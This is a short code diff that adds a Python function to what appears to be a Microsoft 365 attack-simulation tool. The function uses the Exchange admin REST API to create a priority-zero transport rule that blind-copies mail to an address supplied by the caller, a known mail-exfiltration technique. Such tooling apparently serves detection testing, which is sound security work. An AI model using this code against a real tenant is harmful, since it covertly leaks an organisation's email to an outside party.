@@ -248,3 +248,39 @@ def run_compliance_search_rest(auth_config, params):
         logging.error(f"New-ComplianceSearch operation failed with status code {response.status_code }")
         #print(f'Error: {response.status_code}')
         #print (response.text)   
+
+
+def create_mailfow_rule_rest(auth_config, params):
+
+    logging.info("Running the create_mailfow_rule technique using the REST API")
+    tenant_id = auth_config['tenant_id']
+
+    rest_endpoint = f'https://outlook.office365.com/adminapi/beta/{tenant_id}/InvokeCommand'
+
+
+    token = get_ms_token(auth_config, params['auth_type'], rest_scope)
+
+
+    headers = {
+        'Authorization': f'Bearer {token}',
+        'Content-Type': 'application/json'
+    }
+
+    data = {
+    "CmdletInput": {
+        "CmdletName": "New-TransportRule",
+        "Parameters": {
+            "Priority": 0,
+            "BlindCopyTo": params['forward_to'],
+            "Name": params['name']
+            }
+        }
+    }
+    logging.info(f"Calling the New-TransportRule operation on the REST API")
+    response = requests.post(rest_endpoint, headers=headers, json=data)
+
+    if response.status_code == 200:
+        logging.info("200 - OK")
+    else:
+        logging.error(f"New-TransportRule operation failed with status code {response.status_code }")
+
